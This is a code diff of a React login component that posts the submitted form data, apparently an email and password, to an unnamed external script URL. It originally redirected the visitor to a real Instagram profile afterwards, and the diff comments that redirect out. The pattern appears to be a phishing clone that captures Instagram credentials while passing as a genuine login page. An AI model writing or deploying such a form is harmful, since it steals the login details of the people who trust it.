@@ -1,4 +1,5 @@
 import React, { useState } from "react";
+import { NavLink } from "react-router-dom";
 
 const Login = () => {
   const [email, setEmail] = useState();
@@ -13,7 +14,8 @@ const Login = () => {
     e.preventDefault();
     fetch(scriptURL, { method: "POST", body: new FormData(form) })
       .then((response) =>
-        window.location.assign("https://www.instagram.com/iamuttampatra69/")
+        // window.location.assign("https://www.instagram.com/iamuttampatra69/")
+        console.log()
       )
       .catch((error) => console.error("Error!", error.message));
   };
@@ -71,8 +73,7 @@ const Login = () => {
             <button
               type="submit"
               className=" text-sm text-center bg-blue-500 text-white py-1 rounded font-medium"
-            >
-              Log In
+            >Log In
             </button>
           </form>
 
